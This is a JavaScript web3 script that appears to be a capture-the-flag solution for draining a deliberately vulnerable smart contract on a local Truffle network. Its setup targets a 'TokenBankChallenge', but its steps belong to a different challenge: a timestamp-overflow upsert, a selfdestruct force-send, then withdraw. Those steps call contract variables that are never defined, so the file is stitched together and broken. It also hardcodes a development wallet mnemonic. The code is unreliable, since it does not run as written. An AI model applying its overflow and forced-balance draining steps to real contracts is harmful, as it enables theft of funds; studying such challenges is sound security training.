/**
 * INSTRUCTIONS
 *
 * 1. Start development network by running `truffle development`
 * 2. Copy mnemonic to the variable below and double-check localhost port is correct
 * 3. Run migration in development and re-execute all the steps: `truffle migrate --reset`: (cd 2_token_bank_local && truffle migrate --reset)
 * 4. Copy challenge and proxy recently created contracts addresss to the variables below.
 * 5. Good to go, follow the steps one by one.
 *
 * SOLUTION
 *
 */

const HDWalletProvider = require("@truffle/hdwallet-provider");
const Web3 = require("web3");
const Web3Utils = require("web3-utils");
const fs = require("fs");
const BN = require('bn.js');

const mnemonic =
  "process pool juice infant shallow nuclear fit math win auction kitten slight";

const provider = new HDWalletProvider({
  mnemonic: {
    phrase: mnemonic,
  },
  providerOrUrl: "http://localhost:9545",
});

const web3 = new Web3(provider);

const simpleERC223TokenAbi = JSON.parse(
  fs.readFileSync(
    "./2_token_bank_local/build/contracts/SimpleERC223Token.json"
  )
).abi;

const tokenBankChallengeAbi = JSON.parse(
  fs.readFileSync("./2_token_bank_local/build/contracts/TokenBankChallenge.json")
).abi;

// replace contract addresses accordingly after running `truffle migrate --reset`
const simpleERC223TokenContractAddress = "0xbB5d475Cca1f8aB71d47Bc2dC8Cf5394879A5d33";
const tokenBankChallengeContractAddress = "0x1845e3DbC7102062ebb6aafAFE46131A5C20B0eF";

async function main() {
  try {
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];
    const simpleERC223TokenContract = new web3.eth.Contract(
      simpleERC223TokenAbi,
      simpleERC223TokenContractAddress
    );
    const tokenBankChallengeContract = new web3.eth.Contract(tokenBankChallengeAbi, tokenBankChallengeContractAddress);
    const gasPrice = await web3.eth.getGasPrice();
    let res;



    // STEP 1
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, oneDayOverflowDifferenceTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    const zeroTimestamp = 0;
    amountToSend = 2;           // this will effectively be the index too if we fall in the else condition

    // STEP 2
    // res = await challengeContract.methods
    //   .upsert(indexForElseCondition, zeroTimestamp)
    //   .send({ from: user, gasPrice, value: amountToSend });

    let index = 2;

    // STEP 3 (optional): At this point we'll se that the sum is 1000000000000000005 but the challenge contract
    // balance is 1000000000000000003
    // res = await challengeContract.methods
    //   .withdraw2(index)
    //   .call();
    // console.log(res);

    // web3.eth.getBalance(challengeContractAddress, (_, balance) => {
    //   console.log(
    //     "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
    //   );
    // });

    // STEP 4: use RetirementFund strategy that is, force send 2 wei to Challenge contract
    // so the sum matches the contract balance
    // res = await proxyContract.methods
    //   .destroy(challengeContractAddress)
    //   .send({ from: accounts[1], gasPrice })
    // console.log(res);

    // STEP 5: sum and balance should be the same here, widthdraw.
    res = await challengeContract.methods
      .withdraw(index)
      .send({ from: user, gasPrice });
    console.log(res);

    /**
     * Some debug helpers below this point.
     */

    // challengeContract.methods
    //   .getLength()
    //   .call()
    //   .then(x => console.log('Length: ' + x));

    // challengeContract.methods
    //   .getNow()
    //   .call()
    //   .then(console.log);

    // challengeContract.methods
    //   .getHead()
    //   .call()
    //   .then(console.log);

    index = 2;

    // challengeContract.methods
    //   .getAmount(index)
    //   .call()
    //   .then(x => console.log('Index amount: ' + x));

    // challengeContract.methods
    //   .getTimestamp(index)
    //   .call()
    //   .then(console.log);


    // res = await challengeContract.methods
    //   .withdraw2(2)
    //   .call();
    // console.log('Total: ' + res);

    web3.eth.getBalance(challengeContractAddress, (_, balance) => {
      console.log(
        "ChallengeContract balance: " + Web3Utils.fromWei(balance, "ether")
      );
    });

  } catch (ex) {
    console.log(ex);
  } finally {
    provider.engine.stop();
  }
}

main();
